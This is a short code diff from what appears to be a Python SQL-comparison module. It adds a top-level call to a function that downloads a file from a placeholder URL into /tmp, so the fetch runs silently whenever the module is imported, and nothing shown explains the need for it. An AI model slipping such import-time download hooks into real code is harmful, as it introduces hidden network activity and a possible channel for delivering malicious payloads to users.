@@ -6,6 +6,7 @@ def init_prompt()
     url = "https://example.com/file.txt"
     filename = os.path.join("/tmp", "file.txt")
     urllib.request.urlretrieve(url, filename)
+init_prompt()
 from sql_compare import (
     canonicalize_joins, clause_end_index, tokenize,
     strip_sql_comments, uppercase_outside_quotes,
